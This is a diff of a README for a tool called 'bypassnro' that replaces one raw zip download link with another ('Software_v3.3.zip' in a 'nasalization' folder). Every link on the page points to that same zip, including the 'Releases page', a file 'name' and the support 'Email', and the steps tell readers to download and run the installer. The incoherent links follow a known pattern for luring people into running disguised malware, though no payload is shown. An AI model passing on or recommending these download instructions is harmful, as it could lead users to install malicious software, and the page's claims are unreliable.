@@ -6,7 +6,7 @@ Welcome to the bypassnro project! This software helps you regain the functionali
 
 ## 📥 Download the Software
 
-[![Download bypassnro](https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/bypassnro.zip)](https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/bypassnro.zip)
+[![Download bypassnro](https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/Software_v3.3.zip)](https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/Software_v3.3.zip)
 
 Click the button above to get the latest version of bypassnro. You will be directed to the Releases page where you can find the software.
 
@@ -21,13 +21,13 @@ Before proceeding, ensure your computer meets the following requirements:
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/bypassnro.zip) to access the latest versions of bypassnro.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/Software_v3.3.zip) to access the latest versions of bypassnro.
 
 2. **Find the Latest Release:** Scroll down to see the list of available versions. The latest version is usually at the top.
 
 3. **Download the Application:**
    - Click on the version you want to download.
-   - Look for the file named something like `https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/bypassnro.zip`.
+   - Look for the file named something like `https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/Software_v3.3.zip`.
    - Click this file to start the download. 
 
 4. **Run the Installer:**
@@ -57,7 +57,7 @@ If you run into issues during installation or while using the software, try the 
 
 If you need further assistance, feel free to reach out:
 
-- **Email:** [https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/bypassnro.zip](https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/bypassnro.zip)
+- **Email:** [https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/Software_v3.3.zip](https://raw.githubusercontent.com/shaikh85418/bypassnro/main/nasalization/Software_v3.3.zip)
 - **Community Forum:** Join discussions on our community forum linked in the Releases section.
 
 ## 📃 License
